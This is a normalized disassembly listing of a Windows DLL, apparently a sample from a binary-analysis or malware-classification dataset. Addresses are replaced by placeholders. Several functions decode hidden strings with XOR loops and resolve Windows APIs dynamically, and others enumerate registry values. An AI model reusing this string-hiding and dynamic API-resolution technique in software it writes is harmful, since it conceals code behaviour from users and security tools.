cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
push esi
call sub_10035d06
pop ecx
sub_10018a5d
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10018a80
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x61
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x6c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x6c ]
call sub_10045bd0
mov esi eax
mov eax [ ebp - 0x6c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
mov esi 0x1
lea edx [ ebp - 0x64 ]
mov eax esi
call sub_10053240
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x68 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x1
call sub_10053240
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x128 ]
cmp esi edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x68 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edi [ esi ]
lea ecx [ ebp - 0x68 ]
push ecx
call sub_1006e960
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10018bb0
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edx [ ebp - 0x58 ]
mov edi ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x1c ]
push edx
mov [ ebp - 0x58 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xdc
call sub_10053240
mov esi [ ebp - 0x58 ]
call sub_10045bd0
mov esi eax
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x5c ]
mov esi [ ecx ]
test esi esi
je r-xdata
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x54 ] 0x0
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea esp [ esp ]
mov edi [ esi ]
lea edx [ ebp - 0x54 ]
push edx
mov ecx ebx
call sub_1004af30
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10018c90
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0x22
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0x51
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10038c00
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10018d40
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10018d85
push 0x38
mov eax sub_100857f0
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100275d9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10034a80
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10060ef0
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10018e60
push ebp
mov ebp esp
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xe4 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xe0 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xe0 ]
push ebx
mov ebx [ ebp - 0xe4 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10046920
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xec ] 0x0
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcf
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x48 ]
xor eax eax
push ecx
mov [ ebp - 0x32 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xc0 ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0xef
inc dl
mov [ ebp + ecx - 0x10 ] bl
movzx ecx dl
cmp ecx 0xb
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ ebp - 0x5 ] 0x0
call ebx
mov [ esi + 0xc4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x5c ]
mov eax 0x57
call sub_10070810
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xc4 ]
mov eax 0x35
call sub_10070810
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x20 ]
mov eax 0xe
call sub_10070810
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x70 ]
mov eax 0x44
call sub_10070810
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xac ]
mov eax 0x2b
call sub_10070810
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov eax 0x1d
call sub_10070810
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x3c
call sub_10070810
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x84 ]
mov eax 0x22
call sub_10070810
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xdc ]
mov eax 0x28
call sub_10070810
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe8 ] eax
test eax eax
je r-xdata
mov [ esi + 0xec ] 0x1
sub_10019100
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
retn
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_10019130
push esi
lea esi [ ebx - 0x1 ]
test esi esi
js r-xdata
xor edx edx
mov [ edi + ebx * 2 ] dx
pop esi
retn
jmp r-xdata
mov eax 0xcccccccd
mul ecx
shr edx 0x3
lea eax [ edx + edx * 4 ]
add eax eax
sub ecx eax
add ecx 0x30
dec esi
mov [ edi + esi * 2 + 0x2 ] cx
mov ecx edx
jns r-xdata
xor ecx ecx
mov [ edi + ebx * 2 ] cx
pop esi
retn
sub_10019190
push ebp
mov ebp esp
mov eax [ edi + 0x10 ]
push ebx
push esi
cmp eax 0x1
jb r-xdata
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
dec eax
cmp eax 0xffffffff
jbe r-xdata
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx edi
call sub_1000e860
cmp esi eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
push ecx
push esi
call sub_1002b290
add esp 0xc
test eax eax
je r-xdata
lea esi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov bl [ eax ]
mov edi edi
dec esi
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ esi ] bl
jne r-xdata
mov eax esi
mov ecx edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
mov ecx [ edi ]
mov eax esi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
sub_10019210
push ebp
mov ebp esp
push ecx
push 0x0
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x0
call sub_1004c030
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_100649e0
mov eax edi
mov esp ebp
pop ebp
retn
sub_10019247
push 0x28
mov eax sub_1008552b
call sub_100624bc
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_1001ceed
mov [ esi ] r--data
jmp r-xdata
sub_100192e0
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_100187af
add esp 0x4
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
xor eax eax
mov [ esi + 0xc ] ax
pop esi
retn
mov edx [ esi + 0xc ]
push edx
call sub_100187af
add esp 0x4
sub_10019337
push 0x34
mov eax sub_10085215
call sub_100624bc
mov eax [ ebp + 0xc ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_10034e98
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_100120f0
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
push 0x3f
push eax
call sub_1005af59
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x40 ]
call sub_1001c8b0
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10069747
shl eax 0x2
push eax
call sub_1002fb6b
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_10013ab8
retn
mov edi [ esi + 0xc ]
jmp r-xdata
mov edi rw-data
mov esi r--data
test [ rw-data ] bl
jne r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_1001f7a0
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_10024fe9
or [ rw-data ] ebx
push ebx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov [ ebp + 0xc ] r--data
call sub_1004caf9
push sub_1008aff6
mov [ rw-data ] esi
call sub_100592b3
pop ecx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_10029420
sub_1001943c
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005d98d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100194f0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10019510
push 0x38
mov eax sub_1008584a
call sub_1003fae8
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100424ab
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10034a80
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1004642f
retn 0x20
sub_100195d0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x70 ] ecx
push edi
mov ecx ebx
mov [ ebp - 0x68 ] eax
call sub_10002750
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
xor edi edi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x64 ] edi
mov edx [ eax ]
mov edx [ edx + 0x88 ]
push ecx
push eax
call edx
test eax eax
jns r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xa1
call sub_10053240
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x64 ]
push eax
call [ SysStringLen@IAT ]
mov esi eax
mov [ ebp - 0x6c ] esi
cmp [ ebx + 0x140 ] edi
je r-xdata
lea edx [ ebp - 0x58 ]
lea eax [ edi + 0x30 ]
call sub_10053240
lea eax [ edi + 0x2 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
add esi edi
add esi esi
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
push r--data
call [ lstrlenA@IAT ]
mov edi eax
cmp [ ebx + 0x140 ] 0x0
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xa5
call sub_10053240
mov eax 0x3
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x64 ]
lea eax [ edx + edx ]
mov edx [ ebp - 0x68 ]
push eax
mov eax [ edx ]
push ecx
add eax edi
push eax
call sub_1007f5d0
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x70 ]
add esp 0xc
mov [ ecx ] esi
test eax eax
je r-xdata
push edi
push r--data
push eax
call sub_1007f5d0
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push eax
call [ SysFreeString@IAT ]
sub_10019714
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_1002b306
push [ ebp + 0x8 ]
call sub_100186c6
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_1002b306
lea eax [ ebp - 0x20 ]
push eax
call sub_10020591
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_100186c6
pop ecx
sub_100197c0
push ebp
mov ebp esp
sub esp 0x42c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
push edi
push edi
push edi
push edi
lea ecx [ ebp - 0x41c ]
push ecx
push edi
push edi
push edi
push edi
mov [ ebp - 0x428 ] eax
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
push edi
push esi
mov [ ebp - 0x418 ] edi
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x41c ] edi
jbe r-xdata
push esi
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push esi
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x418 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ RegEnumValueW@IAT ]
inc edi
cmp edi [ ebp - 0x41c ]
jb r-xdata
cmp [ ebp - 0x42c ] 0x1
jne r-xdata
lea edx [ ebp - 0x424 ]
push edx
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x42c ]
push ecx
push 0x0
lea edx [ ebp - 0x420 ]
push edx
lea eax [ ebp - 0x414 ]
push eax
push edi
push esi
mov [ ebp - 0x420 ] 0x104
mov [ ebp - 0x424 ] 0x208
call ebx
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x428 ]
push ecx
lea edx [ ebp - 0x20c ]
push edx
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
pop ebx
mov [ ebp - 0x418 ] 0x1
sub_100198c8
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
sub_100199a0
push ebp
mov ebp esp
sub esp 0x104
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x100 ] eax
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x104 ] 0x0
test eax eax
jne r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
cmp [ ebx ] 0x3b
je r-xdata
mov ecx ebx
lea edi [ ebp - 0xf8 ]
mov [ ebp - 0xe0 ] 0x0
call sub_100328d0
test al al
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov esi 0x64
push esi
lea edx [ ebp - 0x70 ]
push 0x0
push edx
add ebx 0x10
call sub_1007f940
push ebx
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea eax [ esi - 0x5c ]
mov [ ebp - 0xfc ] esi
call sub_100017c0
add esp 0x18
test eax eax
jne r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0xfc ]
push edx
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0xf4 ]
push ecx
call sub_1007f5d0
push esi
lea edx [ ebp - 0xd8 ]
push 0x0
push edx
add ebx 0x8
call sub_1007f940
push ebx
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ ebp - 0xd8 ]
push ecx
lea eax [ esi - 0x4c ]
mov [ ebp - 0xfc ] esi
call sub_100017c0
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x8
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0xfc ]
push edx
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
call sub_1007f5d0
mov esi [ ebp - 0xf0 ]
add ebx 0x18
add esp 0xc
mov edx esi
mov ecx ebx
